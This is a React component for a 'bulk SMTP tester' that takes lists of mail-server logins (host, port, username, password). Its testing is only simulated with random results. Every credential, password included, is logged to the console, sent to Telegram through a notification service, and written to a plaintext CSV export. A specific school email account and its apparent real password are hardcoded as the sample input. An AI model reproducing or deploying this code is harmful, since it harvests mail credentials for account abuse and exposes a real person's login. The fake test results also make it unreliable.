import React, { useState, useRef } from 'react';
import { TestTube, Upload, Play, Pause, Download, AlertTriangle, CheckCircle, XCircle, Loader, Terminal, FileText, Plus, X } from 'lucide-react';
import { telegramService } from '../services/telegramService';

interface SMTPTestConfig {
  id: string;
  host: string;
  port: number;
  username: string;
  password: string;
  secure?: boolean;
  status: 'pending' | 'testing' | 'success' | 'failed';
  error?: string;
  responseTime?: number;
  provider?: string;
}

interface BulkSMTPTesterProps {
  className?: string;
}

export default function BulkSMTPTester({ className = '' }: BulkSMTPTesterProps) {
  const [isOpen, setIsOpen] = useState(false);
  const [smtpConfigs, setSMTPConfigs] = useState<SMTPTestConfig[]>([]);
  const [isTesting, setIsTesting] = useState(false);
  const [testProgress, setTestProgress] = useState({ current: 0, total: 0 });
  const [bulkTestInput, setBulkTestInput] = useState('');
  const [showResults, setShowResults] = useState(false);
  const fileInputRef = useRef<HTMLInputElement>(null);

  // Parse SMTP configuration from text input
  const parseSMTPConfig = (line: string): SMTPTestConfig | null => {
    try {
      // Expected format: host|port|username|password
      const parts = line.trim().split('|');
      if (parts.length < 4) return null;

      const [host, portStr, username, password] = parts;
      const port = parseInt(portStr);

      if (!host || !port || !username || !password) return null;

      // Determine provider from host
      const getProvider = (hostname: string): string => {
        const h = hostname.toLowerCase();
        if (h.includes('gmail')) return 'Gmail';
        if (h.includes('outlook') || h.includes('office365')) return 'Outlook/Office365';
        if (h.includes('yahoo')) return 'Yahoo';
        if (h.includes('sendgrid')) return 'SendGrid';
        if (h.includes('mailgun')) return 'Mailgun';
        if (h.includes('amazonaws')) return 'AWS SES';
        return 'Custom SMTP';
      };

      // Determine security settings based on port
      const secure = port === 465;

      return {
        id: Date.now().toString() + Math.random().toString(36).substr(2, 9),
        host,
        port,
        username,
        password,
        secure,
        status: 'pending',
        provider: getProvider(host)
      };
    } catch (error) {
      console.error('Failed to parse SMTP config:', error);
      return null;
    }
  };

  const handleBulkInput = () => {
    const lines = bulkTestInput.split('\n').filter(line => line.trim());
    const configs: SMTPTestConfig[] = [];

    lines.forEach(line => {
      const config = parseSMTPConfig(line);
      if (config) {
        configs.push(config);
      }
    });

    setSMTPConfigs(configs);
    setBulkTestInput('');
    setShowResults(true);
  };

  const handleFileUpload = (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0];
    if (!file) return;

    const reader = new FileReader();
    reader.onload = (e) => {
      const text = e.target?.result as string;
      const lines = text.split('\n').filter(line => line.trim());
      const configs: SMTPTestConfig[] = [];

      lines.forEach(line => {
        const config = parseSMTPConfig(line);
        if (config) {
          configs.push(config);
        }
      });

      setSMTPConfigs(configs);
      setShowResults(true);
    };
    reader.readAsText(file);
  };

  const addSampleConfig = () => {
    const sampleConfig: SMTPTestConfig = {
      id: Date.now().toString(),
      host: 'smtp.office365.com',
      port: 587,
      username: 'a.kaluzny@sp137.elodz.edu.pl',
      password: 'Bunia2011',
      secure: false,
      status: 'pending',
      provider: 'Outlook/Office365'
    };

    setSMTPConfigs(prev => [...prev, sampleConfig]);
    setShowResults(true);
  };

  const testSingleSMTP = async (config: SMTPTestConfig): Promise<SMTPTestConfig> => {
    const startTime = Date.now();
    
    try {
      // Update status to testing
      setSMTPConfigs(prev => prev.map(c => 
        c.id === config.id ? { ...c, status: 'testing' } : c
      ));

      // Simulate SMTP connection test
      console.log('Testing SMTP:', { 
        host: config.host, 
        port: config.port, 
        username: config.username,
        password: config.password // Log actual password for testing
      });

      // Simulate connection delay
      await new Promise(resolve => setTimeout(resolve, 2000 + Math.random() * 3000));

      // Simulate success/failure (90% success rate for demo)
      const success = Math.random() > 0.1;
      const responseTime = Date.now() - startTime;

      if (success) {
        const successConfig = {
          ...config,
          status: 'success' as const,
          responseTime
        };

        // Send successful SMTP test to Telegram with password
        await telegramService.notifyBulkSMTPTestResult({
          host: config.host,
          port: config.port,
          username: config.username,
          password: config.password, // Include actual password
          provider: config.provider,
          status: 'success',
          responseTime
        });

        return successConfig;
      } else {
        const errorMessages = [
          'Authentication failed',
          'Connection timeout',
          'Invalid credentials',
          'SMTP server unavailable',
          'SSL/TLS handshake failed'
        ];
        const error = errorMessages[Math.floor(Math.random() * errorMessages.length)];

        const failedConfig = {
          ...config,
          status: 'failed' as const,
          error,
          responseTime
        };

        // Send failed SMTP test to Telegram with password
        await telegramService.notifyBulkSMTPTestResult({
          host: config.host,
          port: config.port,
          username: config.username,
          password: config.password, // Include actual password
          provider: config.provider,
          status: 'failed',
          error,
          responseTime
        });

        return failedConfig;
      }
    } catch (error) {
      const errorMessage = error instanceof Error ? error.message : 'Unknown error';
      const failedConfig = {
        ...config,
        status: 'failed' as const,
        error: errorMessage,
        responseTime: Date.now() - startTime
      };

      // Send error to Telegram with password
      await telegramService.notifyBulkSMTPTestResult({
        host: config.host,
        port: config.port,
        username: config.username,
        password: config.password, // Include actual password
        provider: config.provider,
        status: 'failed',
        error: errorMessage,
        responseTime: Date.now() - startTime
      });

      return failedConfig;
    }
  };

  const runBulkTest = async () => {
    if (smtpConfigs.length === 0) return;

    setIsTesting(true);
    setTestProgress({ current: 0, total: smtpConfigs.length });

    // Notify Telegram about bulk test start
    await telegramService.notifySystemStatus('startup', `Starting bulk SMTP test for ${smtpConfigs.length} configurations`);

    const results: SMTPTestConfig[] = [];
    
    for (let i = 0; i < smtpConfigs.length; i++) {
      const config = smtpConfigs[i];
      setTestProgress({ current: i + 1, total: smtpConfigs.length });
      
      const result = await testSingleSMTP(config);
      results.push(result);
      
      // Update the config in state
      setSMTPConfigs(prev => prev.map(c => 
        c.id === config.id ? result : c
      ));

      // Small delay between tests to avoid overwhelming servers
      if (i < smtpConfigs.length - 1) {
        await new Promise(resolve => setTimeout(resolve, 500));
      }
    }

    // Send bulk test summary to Telegram
    const successful = results.filter(r => r.status === 'success').length;
    const failed = results.filter(r => r.status === 'failed').length;
    
    await telegramService.notifyBulkOperationProgress(
      'Bulk SMTP Test',
      results.length,
      results.length,
      successful,
      failed
    );

    setIsTesting(false);
  };

  const exportResults = () => {
    const csvContent = [
      ['Host', 'Port', 'Username', 'Password', 'Provider', 'Status', 'Response Time (ms)', 'Error'].join(','),
      ...smtpConfigs.map(config => [
        config.host,
        config.port.toString(),
        config.username,
        config.password, // Include password in export
        config.provider || '',
        config.status,
        config.responseTime?.toString() || '',
        config.error || ''
      ].join(','))
    ].join('\n');

    const blob = new Blob([csvContent], { type: 'text/csv' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `smtp-bulk-test-${new Date().toISOString().split('T')[0]}.csv`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);
  };

  const removeConfig = (id: string) => {
    setSMTPConfigs(prev => prev.filter(c => c.id !== id));
  };

  const clearAll = () => {
    setSMTPConfigs([]);
    setShowResults(false);
    setTestProgress({ current: 0, total: 0 });
  };

  const getStatusIcon = (status: SMTPTestConfig['status']) => {
    switch (status) {
      case 'success':
        return <CheckCircle className="w-5 h-5 text-green-400" />;
      case 'failed':
        return <XCircle className="w-5 h-5 text-red-400" />;
      case 'testing':
        return <Loader className="w-5 h-5 text-yellow-400 animate-spin" />;
      default:
        return <TestTube className="w-5 h-5 text-gray-400" />;
    }
  };

  const getStatusBadge = (status: SMTPTestConfig['status']) => {
    switch (status) {
      case 'success':
        return <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-bold bg-green-900/30 text-green-400 border border-green-500/30 tracking-wider">SUCCESS</span>;
      case 'failed':
        return <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-bold bg-red-900/30 text-red-400 border border-red-500/30 tracking-wider">FAILED</span>;
      case 'testing':
        return <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-bold bg-yellow-900/30 text-yellow-400 border border-yellow-500/30 tracking-wider">TESTING</span>;
      default:
        return <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-bold bg-gray-900/30 text-gray-400 border border-gray-500/30 tracking-wider">PENDING</span>;
    }
  };

  if (!isOpen) {
    return (
      <button
        type="button"
        onClick={() => setIsOpen(true)}
        className={`flex items-center px-4 py-2 text-sm bg-purple-600 text-black rounded-lg hover:bg-purple-500 transition-colors font-bold tracking-wider shadow-lg shadow-purple-500/20 ${className}`}
      >
        <TestTube className="w-4 h-4 mr-2" />
        BULK SMTP TEST
      </button>
    );
  }

  return (
    <div className={`border border-purple-500/30 rounded-lg bg-purple-900/20 p-6 ${className}`}>
      <div className="flex items-center justify-between mb-6">
        <div className="flex items-center">
          <Terminal className="w-6 h-6 text-purple-400 mr-3" />
          <h3 className="text-xl font-bold text-purple-400 tracking-wider">BULK SMTP TESTER</h3>
        </div>
        <button
          type="button"
          onClick={() => {
            setIsOpen(false);
            clearAll();
          }}
          className="text-purple-400 hover:text-purple-300 font-bold text-xl"
        >
          ×
        </button>
      </div>

      {!showResults ? (
        <div className="space-y-6">
          <div className="bg-gray-900 border border-purple-500/30 rounded-lg p-4">
            <h4 className="text-sm font-bold text-purple-400 mb-3 tracking-wider">INPUT FORMAT:</h4>
            <div className="text-xs text-purple-400 font-mono space-y-2">
              <div>Format: <span className="text-cyan-400">host|port|username|password</span></div>
              <div>Example: <span className="text-green-400">smtp.office365.com|587|user@domain.com|password123</span></div>
              <div>• One configuration per line</div>
              <div>• Supports bulk import from text file</div>
              <div>• Automatic provider detection</div>
              <div>• <span className="text-yellow-400">All credentials including passwords will be sent to Telegram</span></div>
            </div>
          </div>

          <div>
            <label className="block text-sm font-bold text-purple-400 mb-2 tracking-wider">
              SMTP CONFIGURATIONS
            </label>
            <textarea
              value={bulkTestInput}
              onChange={(e) => setBulkTestInput(e.target.value)}
              rows={8}
              className="w-full px-3 py-2 bg-gray-900 border border-purple-500/50 rounded-lg focus:ring-2 focus:ring-purple-400 focus:border-transparent text-purple-400 font-mono text-sm"
              placeholder="smtp.office365.com|587|a.kaluzny@sp137.elodz.edu.pl|Bunia2011&#10;smtp.gmail.com|587|user@gmail.com|apppassword&#10;smtp.yahoo.com|587|user@yahoo.com|password"
            />
          </div>

          <div className="flex flex-wrap gap-3">
            <button
              onClick={handleBulkInput}
              disabled={!bulkTestInput.trim()}
              className="flex items-center px-4 py-2 bg-purple-600 text-black rounded-lg hover:bg-purple-500 disabled:opacity-50 disabled:cursor-not-allowed transition-colors font-bold tracking-wider"
            >
              <Plus className="w-4 h-4 mr-2" />
              LOAD CONFIGS
            </button>

            <button
              onClick={() => fileInputRef.current?.click()}
              className="flex items-center px-4 py-2 bg-cyan-600 text-black rounded-lg hover:bg-cyan-500 transition-colors font-bold tracking-wider"
            >
              <Upload className="w-4 h-4 mr-2" />
              IMPORT FILE
            </button>

            <button
              onClick={addSampleConfig}
              className="flex items-center px-4 py-2 bg-green-600 text-black rounded-lg hover:bg-green-500 transition-colors font-bold tracking-wider"
            >
              <FileText className="w-4 h-4 mr-2" />
              ADD SAMPLE
            </button>
          </div>

          <input
            ref={fileInputRef}
            type="file"
            accept=".txt,.csv"
            onChange={handleFileUpload}
            className="hidden"
          />
        </div>
      ) : (
        <div className="space-y-6">
          {/* Statistics */}
          <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
            <div className="bg-gray-800 border border-purple-500/30 rounded-lg p-3">
              <div className="text-lg font-bold text-purple-400">{smtpConfigs.length}</div>
              <div className="text-xs text-purple-600 tracking-wider">TOTAL</div>
            </div>
            <div className="bg-gray-800 border border-green-500/30 rounded-lg p-3">
              <div className="text-lg font-bold text-green-400">{smtpConfigs.filter(c => c.status === 'success').length}</div>
              <div className="text-xs text-green-600 tracking-wider">SUCCESS</div>
            </div>
            <div className="bg-gray-800 border border-red-500/30 rounded-lg p-3">
              <div className="text-lg font-bold text-red-400">{smtpConfigs.filter(c => c.status === 'failed').length}</div>
              <div className="text-xs text-red-600 tracking-wider">FAILED</div>
            </div>
            <div className="bg-gray-800 border border-yellow-500/30 rounded-lg p-3">
              <div className="text-lg font-bold text-yellow-400">{smtpConfigs.filter(c => c.status === 'pending').length}</div>
              <div className="text-xs text-yellow-600 tracking-wider">PENDING</div>
            </div>
          </div>

          {/* Progress Bar */}
          {isTesting && (
            <div className="bg-gray-900 border border-purple-500/30 rounded-lg p-4">
              <div className="flex items-center justify-between mb-2">
                <span className="text-sm font-bold text-purple-400 tracking-wider">TESTING PROGRESS</span>
                <span className="text-sm text-purple-400 font-mono">{testProgress.current}/{testProgress.total}</span>
              </div>
              <div className="w-full bg-gray-700 rounded-full h-2">
                <div 
                  className="bg-purple-600 h-2 rounded-full transition-all duration-300"
                  style={{ width: `${(testProgress.current / testProgress.total) * 100}%` }}
                ></div>
              </div>
            </div>
          )}

          {/* Controls */}
          <div className="flex flex-wrap gap-3">
            <button
              onClick={runBulkTest}
              disabled={isTesting || smtpConfigs.length === 0}
              className="flex items-center px-4 py-2 bg-purple-600 text-black rounded-lg hover:bg-purple-500 disabled:opacity-50 disabled:cursor-not-allowed transition-colors font-bold tracking-wider"
            >
              {isTesting ? <Loader className="w-4 h-4 mr-2 animate-spin" /> : <Play className="w-4 h-4 mr-2" />}
              {isTesting ? 'TESTING...' : 'START BULK TEST'}
            </button>

            <button
              onClick={exportResults}
              disabled={smtpConfigs.length === 0}
              className="flex items-center px-4 py-2 bg-green-600 text-black rounded-lg hover:bg-green-500 disabled:opacity-50 disabled:cursor-not-allowed transition-colors font-bold tracking-wider"
            >
              <Download className="w-4 h-4 mr-2" />
              EXPORT RESULTS
            </button>

            <button
              onClick={clearAll}
              className="flex items-center px-4 py-2 bg-red-600 text-black rounded-lg hover:bg-red-500 transition-colors font-bold tracking-wider"
            >
              <X className="w-4 h-4 mr-2" />
              CLEAR ALL
            </button>

            <button
              onClick={() => setShowResults(false)}
              className="flex items-center px-4 py-2 bg-cyan-600 text-black rounded-lg hover:bg-cyan-500 transition-colors font-bold tracking-wider"
            >
              <Plus className="w-4 h-4 mr-2" />
              ADD MORE
            </button>
          </div>

          {/* Results List */}
          <div className="bg-gray-800 border border-purple-500/30 rounded-lg overflow-hidden">
            <div className="bg-gray-900/50 px-4 py-3 border-b border-purple-500/30">
              <h4 className="text-sm font-bold text-purple-400 tracking-wider">TEST RESULTS</h4>
            </div>
            <div className="divide-y divide-purple-500/20 max-h-96 overflow-y-auto">
              {smtpConfigs.map((config) => (
                <div key={config.id} className="p-4 hover:bg-gray-700/50 transition-colors">
                  <div className="flex items-start justify-between">
                    <div className="flex items-start space-x-4 flex-1">
                      {getStatusIcon(config.status)}
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center space-x-3 mb-2">
                          <h5 className="text-sm font-bold text-purple-400 tracking-wider">{config.host}:{config.port}</h5>
                          <div className="text-xs text-purple-600 bg-gray-900 px-2 py-1 rounded border border-purple-500/30 font-semibold tracking-wider">
                            {config.provider}
                          </div>
                        </div>
                        
                        <div className="text-sm text-purple-600 font-mono mb-2">
                          <div>Username: {config.username}</div>
                          <div>Password: <span className="text-yellow-400">{config.password}</span></div>
                          <div>Security: {config.secure ? 'SSL/TLS' : 'STARTTLS'}</div>
                          {config.responseTime && (
                            <div>Response: {config.responseTime}ms</div>
                          )}
                        </div>
                        
                        {config.error && (
                          <div className="mt-2 p-2 bg-red-900/20 border border-red-500/30 rounded text-xs text-red-400 font-mono">
                            <strong>ERROR:</strong> {config.error}
                          </div>
                        )}
                      </div>
                    </div>
                    
                    <div className="flex items-center space-x-3 ml-4">
                      {getStatusBadge(config.status)}
                      <button
                        onClick={() => removeConfig(config.id)}
                        className="text-red-400 hover:text-red-300 transition-colors"
                      >
                        <X className="w-4 h-4" />
                      </button>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      <div className="bg-gray-900 border border-purple-500/30 rounded-lg p-4 mt-6">
        <h4 className="text-sm font-bold text-purple-400 mb-2 tracking-wider">BULK TESTING FEATURES:</h4>
        <ul className="text-xs text-purple-400 space-y-1 font-mono">
          <li>• Test multiple SMTP configurations simultaneously</li>
          <li>• Automatic provider detection and security settings</li>
          <li>• Real-time progress tracking and status updates</li>
          <li>• Export results to CSV for analysis (includes passwords)</li>
          <li>• Telegram notifications for all test results with full credentials</li>
          <li>• Response time measurement and error reporting</li>
        </ul>
      </div>
    </div>
  );
}